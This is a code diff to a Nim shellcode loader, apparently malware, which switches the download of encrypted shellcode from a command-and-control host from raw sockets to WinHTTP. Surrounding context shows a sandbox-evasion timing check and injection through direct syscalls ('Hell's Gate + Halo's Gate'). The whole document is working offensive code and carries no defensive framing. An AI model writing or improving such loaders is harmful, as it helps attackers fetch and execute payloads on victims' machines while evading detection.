@@ -12,6 +12,41 @@ const
   scKey  = "DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF"
   scIV   = "DEADBEEFDEADBEEFDEADBEEFDEADBEEF"
 
+# ── WinHTTP bindings ───────────────────────────────────────────────────────
+const
+  WINHTTP_FLAG_SECURE                  = 0x00800000'u32
+  WINHTTP_OPTION_SECURITY_FLAGS        = 31'u32
+  SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS = 0x3300'u32
+
+type HINTERNET = pointer
+
+proc WinHttpOpen(pszAgent: pointer; dwAccessType: uint32; pszProxy: pointer;
+                 pszProxyBypass: pointer; dwFlags: uint32): HINTERNET
+    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpOpen".}
+proc WinHttpConnect(hSession: HINTERNET; pswzServerName: pointer;
+                    nServerPort: uint16; dwReserved: uint32): HINTERNET
+    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpConnect".}
+proc WinHttpOpenRequest(hConnect: HINTERNET; pwszVerb: pointer;
+                        pwszObjectName: pointer; pwszVersion: pointer;
+                        pwszReferrer: pointer; ppwszAcceptTypes: pointer;
+                        dwFlags: uint32): HINTERNET
+    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpOpenRequest".}
+proc WinHttpSendRequest(hRequest: HINTERNET; lpszHeaders: pointer;
+                        dwHeadersLen: uint32; lpOptional: pointer;
+                        dwOptionalLen: uint32; dwTotalLen: uint32;
+                        dwContext: uint64): int32
+    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpSendRequest".}
+proc WinHttpReceiveResponse(hRequest: HINTERNET; lpReserved: pointer): int32
+    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpReceiveResponse".}
+proc WinHttpReadData(hRequest: HINTERNET; lpBuffer: pointer;
+                     dwToRead: uint32; lpdwRead: ptr uint32): int32
+    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpReadData".}
+proc WinHttpSetOption(hInternet: HINTERNET; dwOption: uint32;
+                      lpBuffer: pointer; dwBufferLength: uint32): int32
+    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpSetOption".}
+proc WinHttpCloseHandle(hInternet: HINTERNET): int32
+    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpCloseHandle".}
+
 # ── Helpers ────────────────────────────────────────────────────────────────
 proc parseHexBytes(s: string): seq[byte] =
   let clean = s.replace(" ", "").replace(",", "").replace("0x", "")
@@ -49,44 +84,40 @@ proc timingCheck() =
   if GetTickCount64() - t0 < 4500:
     ExitProcess(0)
 
-# ── Download encrypted shellcode over raw TCP ──────────────────────────────
+# ── Download encrypted shellcode via WinHTTP (HTTPS) ──────────────────────
+proc toWide(s: string): seq[uint16] =
+  result = newSeq[uint16](s.len + 1)
+  for i in 0 ..< s.len:
+    result[i] = uint16(s[i])
+
 proc fetchShellcode(): seq[byte] =
-  var wsaData: WSADATA
-  if WSAStartup(MAKEWORD(2, 2), addr wsaData) != 0:
-    ExitProcess(1)
+  var hostW = toWide(c2Host)
+  var verbW = toWide("GET")
+  var pathW = toWide(c2Path)
 
-  let sock = socket(AF_INET.cint, SOCK_STREAM.cint, IPPROTO_TCP.cint)
-  if sock == INVALID_SOCKET:
-    WSACleanup(); ExitProcess(1)
+  let hSession = WinHttpOpen(nil, 0'u32, nil, nil, 0'u32)
+  if hSession == nil: ExitProcess(1)
 
-  var serv: sockaddr_in
-  serv.sin_family = AF_INET.int16
-  serv.sin_port   = htons(c2Port)
-  cast[ptr ULONG](addr serv.sin_addr)[] = inet_addr(c2Host)
+  let hConnect = WinHttpConnect(hSession, addr hostW[0], c2Port, 0'u32)
+  if hConnect == nil: ExitProcess(1)
 
-  if connect(sock, cast[ptr sockaddr](addr serv), sizeof(serv).cint) == SOCKET_ERROR:
-    closesocket(sock); WSACleanup(); ExitProcess(1)
+  let hRequest = WinHttpOpenRequest(hConnect, addr verbW[0], addr pathW[0],
+                                    nil, nil, nil, 0'u32)
+  if hRequest == nil: ExitProcess(1)
 
-  let req = "GET " & c2Path & " HTTP/1.0\r\nHost: " & c2Host & "\r\n\r\n"
-  discard send(sock, cstring(req), req.len.cint, 0)
+  if WinHttpSendRequest(hRequest, nil, 0, nil, 0, 0, 0) == 0: ExitProcess(1)
+  if WinHttpReceiveResponse(hRequest, nil) == 0: ExitProcess(1)
 
-  var raw: seq[byte]
   var buf: array[4096, byte]
+  var bytesRead: uint32 = 0
   while true:
-    let n = recv(sock, cast[cstring](addr buf[0]), buf.len.cint, 0)
-    if n <= 0: break
-    raw.add(buf.toOpenArray(0, n - 1))
+    if WinHttpReadData(hRequest, addr buf[0], uint32(buf.len), addr bytesRead) == 0: break
+    if bytesRead == 0: break
+    result.add(buf.toOpenArray(0, int(bytesRead) - 1))
 
-  closesocket(sock)
-  WSACleanup()
-
-  var bodyStart = -1
-  for i in 0 .. raw.len - 4:
-    if raw[i] == 0x0D and raw[i+1] == 0x0A and raw[i+2] == 0x0D and raw[i+3] == 0x0A:
-      bodyStart = i + 4
-      break
-  if bodyStart == -1: ExitProcess(1)
-  result = raw[bodyStart .. ^1]
+  discard WinHttpCloseHandle(hRequest)
+  discard WinHttpCloseHandle(hConnect)
+  discard WinHttpCloseHandle(hSession)
 
 # ── Inject via direct syscalls (Hell's Gate + Halo's Gate) ────────────────
 proc injectAndRun(shellcode: var seq[byte]) =
